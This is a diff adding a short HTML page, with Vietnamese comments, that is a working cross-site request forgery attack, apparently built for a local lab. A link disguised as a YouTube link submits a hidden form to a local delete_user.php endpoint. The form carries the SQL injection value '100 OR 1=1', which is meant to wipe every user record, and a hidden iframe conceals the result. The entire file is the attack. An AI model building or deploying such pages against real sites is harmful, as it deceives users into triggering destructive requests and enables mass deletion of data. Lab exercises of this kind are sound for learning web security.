@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Delete User</title>
+</head>
+<body>
+  <!-- Link mồi bẫy -->
+  <a href="https://www.youtube.com/"
+     onclick="document.getElementById('csrfForm').submit();
+              setTimeout(() => window.location.href='https://www.youtube.com/', 500);
+              return false;">
+    Youtube (Xóa hết dữ liệu)
+  </a>
+
+  <!-- Form ẩn thực hiện xóa -->
+  <form id="csrfForm" method="GET" action="http://localhost/csrf/delete_user.php" target="hiddenFrame" style="display:none;">
+      <input type="hidden" name="id" value="100 OR 1=1">
+      <button type="submit"></button>
+  </form>
+
+  <!-- Iframe ẩn để che kết quả -->
+  <iframe name="hiddenFrame" style="display:none;"></iframe>
+</body>
+</html>
